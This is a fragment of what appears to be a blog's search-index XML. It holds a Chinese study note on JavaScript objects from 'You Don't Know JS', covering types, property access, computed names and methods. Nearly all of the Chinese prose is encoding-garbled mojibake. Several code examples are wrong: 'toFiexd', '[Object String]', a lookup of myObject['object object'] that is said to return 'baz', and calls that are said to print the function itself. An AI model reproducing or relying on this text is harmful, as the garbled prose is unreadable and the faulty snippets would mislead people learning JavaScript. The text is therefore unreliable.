ä¸ºå¯¹è±¡ï¼ˆå‡½æ•°ï¼‰åªèƒ½å¤åˆ¶å¼•ç”¨ï¼Œæ— æ³•å¤åˆ¶è¢«å¼•ç”¨çš„å¯¹è±¡æˆ–è€…æ˜¯å‡½æ•°æœ¬èº«ã€‚å¿½è§†è¿™ä¸€ç‚¹ä¼šå¯¼è‡´è®¸å¤šé—®é¢˜ã€‚ æ€»ç»“æ¥è¯´ï¼Œåœ¨ JavaScript ä¸­æ¨¡æ‹Ÿç±»æ˜¯å¾—ä¸å¿å¤±çš„ï¼Œè™½ç„¶èƒ½è§£å†³å½“å‰çš„é—®é¢˜ï¼Œä½†æ˜¯å¯èƒ½ä¼šåŸ‹ä¸‹æ›´å¤šçš„éšæ‚£ã€‚]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>ä½ ä¸çŸ¥é“çš„JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½ ä¸çŸ¥é“çš„JavaScript(ä¸Š)â€”â€”å¯¹è±¡]]></title>
    <url>%2F2019-01-19-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript(%E4%B8%8A)%E2%80%94%E2%80%94%E5%AF%B9%E8%B1%A1.html</url>
    <content type="text"><![CDATA[è¿™ä¸ªç³»åˆ—çš„ä½œå“æ˜¯ä¸Šä¸€æ¬¡å½“å½“ç½‘æœ‰æ´»åŠ¨ä¹°çš„ï¼Œè®°å¾—æ˜¯ä¸Šä¸€å¹´ä¹æœˆä»½å¼€å­¦å­£çš„æ—¶å€™äº†ã€‚åŽé¢ä¸€ç›´æœ‰å…¶ä»–çš„äº‹æƒ…ï¼Œæˆ–è€…è‡ªèº«ä¸€äº›å› ç´ ï¼Œè¿Ÿè¿Ÿæ²¡æœ‰å¼€å°è¿™æœ¬ä¹¦ã€‚ä»Šå¤©ç«‹ä¸‹ä¸€ä¸ª flagï¼Œå¸Œæœ›å¯ä»¥åœ¨ä¸¤ä¸ªæœˆå†…çœ‹å®Œå¹¶è®°å½•è¿™ä¸ªç³»åˆ—çš„ä¸‰æœ¬ä¹¦ï¼Œä¿æŒå­¦ä¹ çš„æ¿€æƒ…ï¼Œä¸æ–­å¼¥è¡¥è‡ªå·±çš„åŸºç¡€ä¸å¤Ÿæ‰Žå®žçš„ç¼ºç‚¹ã€‚ ä½œè€…çš„github ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ï¼Œè‡ªå·±æœã€‚ ä½ ä¸çŸ¥é“çš„JavaScript(ä¸Š)â€”â€”å¯¹è±¡ä¸Šä¸€ç« è®²äº†å‡½æ•°è°ƒç”¨ä½ç½®çš„ä¸åŒä¼šé€ æˆ this ç»‘å®šå¯¹è±¡çš„ä¸åŒï¼Œé‚£ä¹ˆå¯¹è±¡æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ç»‘å®šå®ƒï¼Ÿ è¯­æ³•å¯¹è±¡å¯ä»¥é€šè¿‡ä¸¤ç§å½¢å¼å®šä¹‰ï¼šå£°æ˜Žï¼ˆæ–‡å­—ï¼‰å½¢å¼å’Œæž„é€ å½¢å¼ã€‚ å¯¹è±¡çš„æ–‡å­—è¯­æ³•å¤§æ¦‚æ˜¯è¿™æ ·ï¼š 1234var myObj = &#123; key:value // ...&#125; æž„é€ å½¢å¼å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š 12var myObj = new Object();myObj.key = value; æž„é€ å½¢å¼å’Œæ–‡å­—å½¢å¼ç”Ÿæˆçš„å¯¹è±¡æ˜¯ä¸€æ ·çš„ã€‚å”¯ä¸€çš„åŒºåˆ«æ˜¯ï¼Œåœ¨æ–‡å­—å£°æ˜Žä¸­ä½ å¯ä»¥æ·»åŠ å¤šä¸ªé”®/å€¼å¯¹ï¼Œä½†æ˜¯åœ¨æž„é€ å½¢å¼ä¸­ä½ å¿…é¡»é€ä¸ªæ·»åŠ å±žæ€§ã€‚ ç”¨æž„é€ å½¢å¼åˆ›å»ºå‡ºæ¥çš„å¯¹è±¡æ˜¯éžå¸¸å°‘çš„ï¼Œä¸€èˆ¬æ¥è¯´ä¼šä½¿ç”¨æ–‡å­—è¯­æ³•ï¼Œç»å¤§å¤šæ•°å†…ç½®ä¹Ÿæ˜¯è¿™æ ·åšçš„ã€‚ ç±»åž‹å¯¹è±¡æ˜¯ JavaScript çš„åŸºç¡€ï¼Œåœ¨ JavaScript ä¸­ä¸€å…±æœ‰å…­ç§ä¸»è¦ç±»åž‹ï¼ˆæœ¯è¯­æ˜¯â€œè¯­è¨€ç±»åž‹â€ï¼‰ string number boolean null undefined object æ³¨æ„ï¼Œç®€å•åŸºæœ¬ç±»åž‹ï¼ˆstring,boolean,number,null å’Œ undefinedï¼‰æœ¬èº«å¹¶ä¸æ˜¯å¯¹è±¡ã€‚null æœ‰æ—¶è¢«å½“åšä¸€ç§å¯¹è±¡ç±»åž‹ï¼Œä½†æ˜¯è¿™å…¶å®žåªæ˜¯è¯­è¨€æœ¬èº«çš„ä¸€ä¸ª bug,å³å¯¹ null æ‰§è¡Œ typeof null æ—¶ä¼šè¿”å›žå­—ç¬¦ä¸² â€œobjectâ€(åŽŸç†æ˜¯è¿™æ ·çš„ï¼Œä¸åŒçš„å¯¹è±¡åœ¨åº•å±‚éƒ½è¡¨ç¤ºä¸ºäºŒè¿›åˆ¶ï¼Œåœ¨ JavaScript ä¸­äºŒè¿›åˆ¶å‰ä¸‰ä½éƒ½æ˜¯0çš„è¯ä¼šè¢«åˆ¤æ–­ä¸º object ç±»åž‹ï¼Œnull çš„äºŒè¿›åˆ¶è¡¨ç¤ºå…¨æ˜¯0ï¼Œè‡ªç„¶å‰ä¸‰ä½ä¹Ÿæ˜¯0ï¼Œæ‰€ä»¥æ‰§è¡Œ typeof æ˜¯ä¼šè¿”å›ž â€œobjectâ€)ã€‚å®žé™…ä¸Šï¼Œnull æœ¬èº«æ˜¯åŸºæœ¬ç±»åž‹ã€‚ æœ‰ä¸€ç§å¸¸è§çš„é”™è¯¯è¯´æ˜¯â€œJavaScript ä¸­ä¸‡ç‰©æ˜¯å¯¹è±¡â€ï¼Œè¿™æ˜¾ç„¶æ˜¯é”™è¯¯çš„ã€‚ å®žé™…ä¸Šï¼ŒJavaScript ä¸­æœ‰è®¸å¤šç‰¹æ®Šçš„å¯¹è±¡å­ç±»åž‹ï¼Œæˆ‘ä»¬å¯ä»¥ç§°ä¹‹ä¸ºå¤æ‚åŸºæœ¬ç±»åž‹ã€‚ å‡½æ•°å°±æ˜¯å¯¹è±¡çš„ä¸€ä¸ªå­ç±»åž‹ï¼ˆä»ŽæŠ€æœ¯è§’åº¦æ¥è¯´å°±æ˜¯â€œå¯è°ƒç”¨çš„å¯¹è±¡â€ï¼‰ã€‚JavaScript ä¸­çš„å‡½æ•°æ˜¯â€œä¸€ç­‰å…¬æ°‘â€ï¼Œå› ä¸ºå®ƒä»¬æœ¬è´¨ä¸Šå’Œæ™®é€šå‡½æ•°çš„å¯¹è±¡æ˜¯ä¸€æ ·ï¼ˆåªæ˜¯å¯ä»¥è°ƒç”¨ï¼‰ã€‚æ‰€ä»¥å¯ä»¥åƒæ“ä½œå…¶ä»–å¯¹è±¡ä¸€æ ·æ“ä½œå‡½æ•°ï¼ˆæ¯”å¦‚å½“åšå¦ä¸€ä¸ªå‡½æ•°çš„å‚æ•°ï¼‰ã€‚ æ•°ç»„ä¹Ÿæ˜¯å¯¹è±¡çš„ä¸€ç§ç±»åž‹ï¼Œå…·å¤‡ä¸€äº›é¢å¤–çš„è¡Œä¸ºã€‚æ•°ç»„ä¸­å†…å®¹çš„ç»„ç»‡æ–¹å¼æ¯”ä¸€èˆ¬çš„å¯¹è±¡è¦ç¨å¾®å¤æ‚ä¸€äº›ã€‚ å†…ç½®å¯¹è±¡JavaScript ä¸­è¿˜æœ‰ä¸€äº›å¯¹è±¡å­ç±»åž‹ï¼Œé€šå¸¸è¢«ç§°ä¸ºå†…ç½®å¯¹è±¡ï¼Œæœ‰äº›å†…ç½®å¯¹è±¡çš„åå­—çœ‹èµ·æ¥å’Œç®€å•åŸºç¡€ç±»åž‹ä¸€æ ·ï¼Œä¸è¿‡å®ƒä»¬çš„å…³ç³»æ›´å¤æ‚. Stting Number Boolean Object Function Array Date RegExp Error è¿™äº›å†…ç½®å¯¹è±¡ä»Žè¡¨çŽ°å½¢å¼æ¥è¯´å¾ˆåƒå…¶ä»–è¯­è¨€ä¸­çš„ç±»åž‹ï¼ˆtypeï¼‰æˆ–è€…ç±»ï¼ˆclassï¼‰,æ¯”å¦‚ Java ä¸­çš„ String ç±»ã€‚ ä½†æ˜¯åœ¨ JavaScript ä¸­ï¼Œå®ƒä»¬å®žé™…åªæ˜¯ä¸€äº›å†…ç½®å‡½æ•°ï¼Œè¿™äº›å†…ç½®å‡½æ•°å¯ä»¥å½“åšæž„é€ å‡½æ•°ï¼ˆç”± new äº§ç”Ÿçš„å‡½æ•°ï¼‰æ¥ä½¿ç”¨ï¼Œä»Žè€Œå¯ä»¥æž„é€ ä¸€ä¸ªå¯¹åº”å­ç±»çš„æ–°å¯¹è±¡ã€‚ä¸¾ä¾‹æ¥è¯´ï¼š 12345678910var strPrimitive = "I am a string";typeof strPrimitive; // stringstrPrimitive instanceof String; // falsevar strObject = new String("I am a string");typeof strObject; // objectstrObject instanceof String; // true// æ£€æŸ¥ sub-type å¯¹è±¡Object.prototype.toString.call(strObject); //[Object String] Object.prototype.toString ç®€å•æ¥è¯´ï¼Œå¯ä»¥è®¤ä¸ºå­ç±»åž‹åœ¨å†…éƒ¨å€Ÿç”¨äº† Object ä¸­çš„ toString æ–¹æ³•ï¼Œä»Žä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒstrObject æ˜¯ç”± String æž„é€ å‡½æ•°åˆ›å»ºçš„ä¸€ä¸ªå¯¹è±¡ã€‚ åŽŸå§‹å€¼ â€œI am a stringâ€ å¹¶ä¸æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªå­—é¢é‡ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªä¸å¯å˜çš„å€¼ï¼Œå¦‚æžœè¦åœ¨è¿™ä¸ªå­—é¢é‡ä¸Šæ‰§è¡Œä¸€äº›æ“ä½œï¼Œæ¯”å¦‚èŽ·å–é•¿åº¦ï¼Œè®¿é—®å…¶ä¸­çš„æŸä¸ªå­—ç¬¦ç­‰ï¼Œé‚£éœ€è¦å°†å…¶è½¬æ¢ä¸º String å¯¹è±¡ã€‚ å¹¸å¥½ï¼Œåœ¨å¿…è¦æ—¶è¯­è¨€è‡ªåŠ¨æŠŠå­—ç¬¦å­—é¢é‡è½¬æ¢æˆäº†ä¸€ä¸ª String å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ å¹¶ä¸éœ€è¦æ˜¾ç¤ºåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼ŒJavaScript ç¤¾åŒºæ±‡ä¸­çš„å¤§å¤šæ•°äººéƒ½è®¤ä¸ºèƒ½å¤Ÿä½¿ç”¨æ–‡å­—å½¢å¼æ—¶å°±ä¸è¦ä½¿ç”¨æž„é€ å½¢å¼ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 123var strPrimitive = "I am a string";console.log(strPrimitive.length); // 13console.log(strPrimitive.charAt(3)); // 'm' ä½¿ç”¨ä»¥ä¸Šä¸¤ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æŽ¥åœ¨å­—é¢é‡ä¸Šé¢è®¿é—®å±žæ€§æˆ–è€…æ–¹æ³•ï¼Œä¹‹æ‰€ä»¥å¯ä»¥è¿™æ ·åšï¼Œæ˜¯å› ä¸ºå¼•æ“Žè‡ªåŠ¨æŠŠå­—é¢é‡è½¬æ¢æˆäº† String å¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥è®¿é—®å±žæ€§æˆ–è€…æ–¹æ³•ã€‚åŒæ ·çš„äº‹æƒ…ä¹Ÿä¼šå‘ç”Ÿåœ¨æ•°å€¼å­—é¢é‡ä¸Šï¼Œå¦‚æžœä½¿ç”¨ç±»ä¼¼ 42.457.toFiexd(2)çš„æ–¹æ³•ï¼Œå¼•æ“Žä¼šæŠŠ 42 è½¬æ¢æˆ new Number(42)ï¼Œå¯¹äºŽå¸ƒå°”å­—é¢é‡æ¥è¯´ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ null å’Œ undefined æ²¡æœ‰å¯¹åº”çš„æž„é€ å½¢å¼ï¼Œå®ƒä»¬åªæœ‰æ–‡å­—å½¢å¼ã€‚ç›¸åï¼ŒDate åªæœ‰æž„é€ ï¼Œæ²¡æœ‰æ–‡å­—å½¢å¼ã€‚ å¯¹äºŽ Objectã€Arrayã€Function å’Œ RegExp æ¥è¯´ï¼Œæ— è®ºæ˜¯ä½¿ç”¨æ–‡å­—å½¢å¼è¿˜æ˜¯ä½¿ç”¨æž„é€ å½¢å¼ï¼Œå®ƒä»¬éƒ½æ˜¯å¯¹è±¡ï¼Œä¸æ˜¯å­—é¢é‡ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç›¸æ¯”ç”¨æ–‡å­—å½¢å¼åˆ›å»ºå¯¹è±¡ï¼Œæž„é€ å½¢å¼å¯ä»¥æä¾›é¢å¤–çš„ä¸€äº›é€‰é¡¹ã€‚ç”±äºŽè¿™ä¸¤ç§å½¢å¼éƒ½å¯ä»¥åˆ›å»ºå¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–è¦é€‰çš„æ˜¯æ›´ç®€å•æ–‡å­—å½¢å¼ã€‚å»ºè®®åªåœ¨éœ€è¦é¢å¤–é€‰é¡¹çš„æ—¶å€™ä½¿ç”¨æž„é€ å½¢å¼ã€‚ Error å¯¹è±¡å¾ˆå°‘åœ¨ä»£ç ä¸­æ˜¾ç¤ºåˆ›å»ºï¼Œä¸€èˆ¬æ˜¯åœ¨æŠ›å‡ºå¼‚å¸¸çš„æ—¶å€™è¢«è‡ªåŠ¨åˆ›å»ºçš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ new Error(..) è¿™ç§æž„é€ å½¢å¼æ¥åˆ›å»ºï¼Œä¸è¿‡ä¸€èˆ¬æ¥è¯´æ˜¯ç”¨ä¸åˆ°çš„ã€‚ å†…å®¹ä¹‹å‰æˆ‘ä»¬æåˆ°è¿‡çš„ï¼Œå¯¹è±¡çš„å†…å®¹æ˜¯ç”±ä¸€äº›å­˜å‚¨åœ¨ç‰¹å®šå‘½åä½ç½®çš„ï¼ˆä»»æ„ç±»åž‹çš„ï¼‰å€¼ç»„æˆçš„ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºå±žæ€§ã€‚ éœ€è¦å¼ºè°ƒä¸€ç‚¹æ˜¯ï¼Œå½“æˆ‘ä»¬è¯´â€œå†…å®¹â€æ—¶ï¼Œä¼¼ä¹Žåœ¨æš—ç¤ºè¿™äº›å€¼å®žé™…ä¸Šè¢«å­˜å‚¨åœ¨å¯¹è±¡å†…éƒ¨ï¼Œä½†æ˜¯è¿™åªæ˜¯å®ƒçš„è¡¨çŽ°å½¢å¼ï¼Œåœ¨å¼•æ“Žå†…éƒ¨ï¼Œè¿™äº›å€¼çš„å­˜å‚¨æ–¹å¼æ˜¯å¤šç§å¤šæ ·çš„ï¼Œä¸€èˆ¬å¹¶ä¸ä¼šå­˜åœ¨å¯¹è±¡å®¹å™¨å†…éƒ¨ã€‚å­˜å‚¨åœ¨å¯¹è±¡å®¹å™¨å†…éƒ¨çš„æ˜¯è¿™äº›å±žæ€§çš„åç§°ï¼Œå®ƒä»¬å°±åƒæŒ‡é’ˆï¼ˆå¼•ç”¨ï¼‰ä¸€æ ·ï¼ŒæŒ‡å‘è¿™äº›å€¼çš„çœŸæ­£çš„å­˜å‚¨ä½ç½®ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 12345var myObject = &#123; a:2&#125;myObject.a // 2myObject["a"] // 2 å¦‚æžœè¦è®¿é—® myObject ä¸­ a çš„ä½ç½®ä¸Šçš„å€¼ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨.æ“ä½œç¬¦æˆ–è€…[] æ“ä½œç¬¦ã€‚.a è¯­æ³•é€šå¸¸è¢«ç§°ä¸ºâ€œå±žæ€§è®¿é—®â€ã€‚[â€œaâ€]è¯­æ³•é€šå¸¸è¢«ç§°ä¸º â€œé”®è®¿é—®â€ã€‚å®žé™…ä¸Šå®ƒä»¬è®¿é—®çš„æ˜¯åŒä¸€ä¸ªä½ç½®ï¼Œå¹¶ä¸”ä¼šè¿”å›žç›¸åŒçš„å€¼2ï¼Œæ‰€ä»¥è¿™ä¸¤ä¸ªæœ¯è¯­æ˜¯å¯ä»¥äº’æ¢çš„ã€‚ è¿™ä¸¤ç§è¯­æ³•çš„åŽ»å‘—ä¸»è¦æ˜¯ï¼Œæ“ä½œç¬¦è¦æ±‚å±žæ€§åæ»¡è¶³æ ‡è¯†ç¬¦çš„å‘½åè§„èŒƒï¼Œè€Œ[â€œ..â€]è¯­æ³•å¯ä»¥æŽ¥å—ä»»æ„ UTF-8/Unicode å­—ç¬¦ä¸²ä½œä¸ºå±žæ€§åã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æžœè¦å¼•ç”¨åç§°ä¸º â€œSuper-Fun!â€çš„å±žæ€§ï¼Œå°±å¿…é¡»ä½¿ç”¨ [â€œSuper-func!â€â€]è¯­æ³•æ¥è®¿é—®ï¼Œå› ä¸º Super-Fun! å¹¶ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ ‡è¯†ç¬¦å±žæ€§åã€‚ æ­¤å¤–ï¼Œç”±äºŽ [â€œ..â€]è¯­æ³•ä½¿ç”¨å­—ç¬¦ä¸²æ¥è®¿é—®å±žæ€§ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ç¨‹åºä¸­æž„é€ è¿™ä¸ªå­—ç¬¦ä¸²ã€‚æ¯”å¦‚è¯´ï¼š 123456789var myObject = &#123; a:2&#125;var idx;if(wantA)&#123; idx = "a"&#125;// ä¹‹åŽconsole.log(myObject[idx]); // 2 åœ¨å¯¹è±¡ä¸­ï¼Œå±žæ€§åæ°¸è¿œå­—ç¬¦ä¸²ï¼Œå¦‚æžœä½ æ˜¯ç”¨ string (å­—é¢é‡)ä»¥å¤–çš„å…¶ä»–å€¼ä½œä¸ºå±žæ€§åï¼Œé‚£å®ƒé¦–å…ˆä¼šè½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚å³ä½¿æ˜¯æ•°å­—ä¹Ÿä¸ä¾‹å¤–ï¼Œè™½ç„¶åœ¨æ•°ç»„ä¸‹æ ‡ä¸­ä½¿ç”¨çš„æ˜¯æ•°å­—ï¼Œä½†æ˜¯åœ¨å¯¹è±¡å±žæ€§åä¸­æ•°å­—ä¼šè¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å½“å¿ƒä¸è¦æžæ··å¯¹è±¡å’Œæ•°ç»„ä¸­æ•°å­—çš„ç”¨æ³•ï¼š 12345678var myObject = &#123;&#125;;myObject[true] = "foo";myObject[3] = "bar";myObject[myObject] = "baz"myObject["true"]; // foomyObject["3"]; // barmyObject["object object"]; // baz å¯è®¡ç®—å±žæ€§åå¦‚æžœéœ€è¦é€šè¿‡è¡¨è¾¾å¼æ¥è®¡ç®—å±žæ€§åï¼Œé‚£ä¹ˆåˆšåˆšè®²åˆ°çš„ myObject[..]è¿™ç§å±žæ€§è®¿é—®è¯­æ³•å°±æœ‰ç”¨äº†ï¼Œå¦‚å¯ä»¥ä½¿ç”¨ myObject[prefix + name]ã€‚ä½†æ˜¯ä½¿ç”¨æ–‡å­—å½¢å¼æ¥è®¿é—®å¯¹è±¡æ—¶è¿™æ ·åšæ˜¯ä¸è¡Œçš„ã€‚ ES6 å¢žåŠ äº†å¯è®¡ç®—å±žæ€§åï¼Œå¯ä»¥åœ¨æ–‡å­—å½¢å¼ä¸­ ä½¿ç”¨ []åŒ…è£¹ä¸€ä¸ªè¡¨è¾¾å¼æ¥ä½œä¸ºå±žæ€§åï¼š 1234567var prefix = "foo";var myObject = &#123; [prefix + "bar"]ï¼š"hello", [prefix + "baz"]ï¼š"world",&#125;myObject["foobar"]; // hellomyObject["foobaz"]; // world å¯è®¡ç®—å±žæ€§åæœ€å¸¸ç”¨çš„åœºæ™¯æ˜¯ ES6 çš„ç¬¦å·ï¼ˆSymbolï¼‰ï¼Œç®€å•æ¥è¯´ï¼Œå®ƒä»¬æ˜¯ä¸€ç§æ–°çš„åŸºç¡€æ•°æ®ç±»åž‹ï¼ŒåŒ…å«ä¸€ä¸ªä¸é€æ˜Žå¹¶ä¸”æ— æ³•é¢„æµ‹çš„å€¼ï¼ˆä»ŽæŠ€æœ¯è§’åº¦æ¥è¯´å°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰ã€‚ä¸€èˆ¬æ¥è¯´ä½ ä¸ä¼šç”¨åˆ°çš„ç¬¦å·çš„å®žé™…å€¼ï¼ˆå› ä¸ºç†è®ºä¸Šæ¥è¯´åœ¨ä¸åŒçš„ JavaScript å¼•æ“Žä¸­å€¼æ˜¯ä¸åŒçš„ï¼‰ï¼Œæ‰€ä»¥é€šå¸¸ä½ æŽ¥è§¦çš„æ˜¯ç¬¦å·çš„åç§°ï¼Œæ¯”å¦‚ Symbol.Something 123var myObject = &#123; [Symbol.Something]:"hello world"&#125; å±žæ€§ä¸Žæ–¹æ³•å¦‚æžœè®¿é—®çš„å¯¹è±¡å±žæ€§æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæœ‰äº›å¼€å‘è€…å–œæ¬¢ä½¿ç”¨ä¸ä¸€æ ·çš„å«åšä»¥ä½œåŒºåˆ†ï¼Œç”±äºŽå‡½æ•°å¾ˆå®¹æ˜“è¢«è®¤ä¸ºæ˜¯å±žäºŽæŸä¸ªå¯¹è±¡ï¼Œåœ¨å…¶ä»–è¯­è¨€ä¸­ï¼Œå±žäºŽå¯¹è±¡ï¼ˆä¹Ÿè¢«ç§°ä¸º â€œç±»â€ï¼‰çš„å‡½æ•°é€šå¸¸è¢«ç§°ä¸ºâ€œæ–¹æ³•â€ï¼Œå› æ­¤æŠŠâ€œå±žæ€§è®¿é—®â€è¯´æˆâ€œæ–¹æ³•è®¿é—®â€ä¹Ÿå°±ä¸å¥‡æ€ªäº†ã€‚ JavaScript çš„è¯­æ³•è§„èŒƒä¹Ÿä½œå‡ºäº†åŒæ ·çš„åŒºåˆ†ã€‚ä»ŽæŠ€æœ¯è§’åº¦æ¥è¯´ï¼Œå‡½æ•°æ°¸è¿œä¸ä¼šâ€œå±žäºŽâ€ä¸€ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥æŠŠå¯¹è±¡å†…éƒ¨å¼•ç”¨çš„å‡½æ•°ç§°ä¸ºâ€œæ–¹æ³•â€ä¼¼ä¹Žæœ‰ç‚¹ä¸å¦¥ã€‚ç¡®å®žï¼Œæœ‰äº›å‡½æ•°å…·æœ‰ this å¼•ç”¨ï¼Œæœ‰æ—¶å€™è¿™äº› this ç¡®å®žä¼šæŒ‡å‘è°ƒç”¨ä½ç½®çš„å¯¹è±¡å¼•ç”¨ï¼Œä½†æ˜¯è¿™ç§ç”¨æ³•ä»Žæœ¬è´¨ä¸Šè¯´å¹¶æ²¡æœ‰æŠŠè¿™ä¸ªå‡½æ•°å˜æˆä¸€ä¸ªâ€œæ–¹æ³•â€ï¼Œå› ä¸º this æ˜¯åœ¨è¿è¡Œæ—¶æ ¹æ®è°ƒç”¨ä½ç½®åŠ¨æ€ç»‘å®šçš„ï¼Œæ‰€ä»¥å‡½æ•°å’Œå¯¹è±¡çš„å…³ç³»æœ€å¤šä¹Ÿåªèƒ½è¯´æ˜¯é—´æŽ¥å…³ç³»ã€‚ æ— è®ºè¿”å›žå€¼æ˜¯ä»€ä¹ˆç±»åž‹ï¼Œæ¯æ¬¡è®¿é—®å¯¹è±¡çš„å±žæ€§å°±æ˜¯å±žæ€§è®¿é—®ï¼Œå¦‚æžœå±žæ€§è®¿é—®æ”¾å›žçš„æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œé‚£å®ƒä¹Ÿå¹¶ä¸æ˜¯ä¸€ä¸ªâ€œæ–¹æ³•â€ã€‚å±žæ€§è®¿é—®è¿”å›žçš„å‡½æ•°å’Œå…¶ä»–å‡½æ•°æ²¡æœ‰ä»»ä½•åŒºåˆ«ï¼ˆå¤„ç†å¯èƒ½å‘ç”Ÿçš„éšå¼ç»‘å®š thisï¼‰ã€ ä¸¾ä¸ªä¾‹å­ï¼š 12345678910function foo()&#123; console.log("foo");&#125;var someFoo = foo; // å¯¹ foo å˜é‡å¼•ç”¨var myObject = &#123; someFoo:foo&#125;foo(); // function foo()&#123;...&#125;someFoo(); // function foo()&#123;...&#125;myObject.someFoo; // function foo()&#123;...&#125; someFoo å’Œ myObject.someFoo åªæ˜¯å¯¹äºŽåŒä¸€ä¸ªå‡½æ•°çš„ä¸åŒå¼•ç”¨ï¼Œå¹¶ä¸èƒ½è¯´æ˜Žè¿™ä¸ªå‡½æ•°æ˜¯ç‰¹åˆ«çš„æˆ–è€…â€œå±žäºŽâ€æŸä¸ªå¯¹è±¡ã€‚å¦‚æžœ foo()å®šä¹‰æ—¶åœ¨å†…éƒ¨æœ‰ä¸€ä¸ª this å¼•ç”¨ï¼Œé‚£è¿™ä¸¤ä¸ªå‡½æ•°å¼•ç”¨çš„å”¯ä¸€åŒºåˆ«å°±æ˜¯ myObject.someFoo ä¸­çš„ this ä¼šè¢«éšå¼ç»‘å®šåˆ°ä¸€ä¸ªå¯¹è±¡ã€‚æ— è®ºå“ªç§å¼•ç”¨å½¢å¼å¦ä¸èƒ½ç§°ä¹‹ä¸ºâ€æ–¹æ³•â€ æœ€ä¿é™©çš„è¯´æ³•æ˜¯ï¼Œâ€œå‡½æ•°â€å’Œâ€œæ–¹æ³•â€åœ¨ JavaScript ä¸­æ˜¯å¯ä»¥äº’æ¢çš„ã€‚ ES6 ä¸­å¢žåŠ äº† super å¼•ç”¨ï¼Œä¸€èˆ¬æ¥è¯´ä¼šè¢«ç”¨åœ¨ class ä¸­ã€‚super çš„è¡Œä¸ºä¼¼ä¹Žæ›´æœ‰ç†ç”±æŠŠ super ç»‘å®šçš„å‡½æ•°ç§°ä¸º â€œæ–¹æ³•â€ï¼Œä½†æ˜¯ï¼Œè¿™äº›åªæ˜¯ä¸€äº›è¯­ä¹‰ï¼ˆå’ŒæŠ€æœ¯ï¼‰ä¸Šçš„å¾®å¦™å·®åˆ«ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ å³ä½¿åœ¨å¯¹è±¡çš„æ–‡å­—å½¢å¼å£°æ˜Žäº†ä¸€ä¸ªå‡½æ•°è¡¨è¾¾å¼ï¼Œè¿™ä¸ªå‡½æ•°ä¹Ÿä¸ä¼šâ€å±žäºŽâ€è¿™ä¸ªå¯¹è±¡â€”â€”å®ƒä»¬åªæ˜¯å¯¹ç›¸åŒå‡½æ•°å¯¹è±¡çš„å¤šä¸ªå¼•ç”¨ 12345678var myObject = &#123; foo:function()&#123; console.log("foo"); &#125;&#125;var someFoo = myObject.foo;someFoo; // function foo()&#123;...&#125;myObject.foo; //function foo()&#123;...&#125; æ•°ç»„æ•°ç»„ä¹Ÿæ”¯æŒ[]è®¿é—®å½¢å¼ï¼Œæ•°ç»„æœ‰ä¸€å¥—æ›´åŠ ç»“æž„åŒ–çš„å€¼å­˜å‚¨æœºåˆ¶ï¼ˆä¸è¿‡ä»ç„¶ä¸é™åˆ¶å€¼çš„ç±»åž‹ï¼‰ã€‚æ•°ç»„æœŸæœ›çš„æ˜¯æ•°å€¼ä¸‹æ ‡ï¼Œä¹Ÿå°±æ˜¯è¯´å€¼å­˜å‚¨ä½ç½®ï¼ˆé€šå¸¸è¢«ç§°ä¸ºç´¢å¼•ï¼‰æ˜¯éžè´Ÿæ•´æ•°ï¼Œæ¯”å¦‚è¯´ 0 å’Œ 42 1234var myArray = ["foo",42,"bar"];myArray.length; //3myArray[0]; // "foo"myArray[2]; // "bar" æ•°ç»„ä¹Ÿæ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥è™½ç„¶æ¯ä¸ªå°æ ‡éƒ½æ˜¯æ•´æ•°ï¼Œä½ ä»ç„¶å¯ä»¥ç»™æ•°ç»„æ·»åŠ å±žæ€§ï¼š 1234var myArray = ["foo",42,"bar"];myArray.baz = "baz";myArray.length; // 3myArray.baz; // "baz" å¯ä»¥çœ‹åˆ°è™½ç„¶æ·»åŠ äº†å‘½åå±žæ€§ï¼ˆæ— è®ºæ˜¯é€šè¿‡.è¯­æ³•è¿˜æ˜¯[]è¯­æ³•ï¼‰ï¼Œæ•°ç»„çš„ length å€¼å¹¶æœªå‘ç”Ÿå˜åŒ–ã€‚å®Œå…¨å¯ä»¥æŠŠæ•°ç»„å½“åšä¸€ä¸ªæ™®é€šçš„é”®/å€¼å¯¹è±¡æ¥ä½¿ç”¨ï¼Œå¹¶ä¸”ä¸æ·»åŠ ä»»ä½•æ•°å€¼ç´¢å¼•ï¼Œä½†æ˜¯è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ã€‚æ•°ç»„å’Œæ™®é€šçš„å¯¹è±¡éƒ½æ 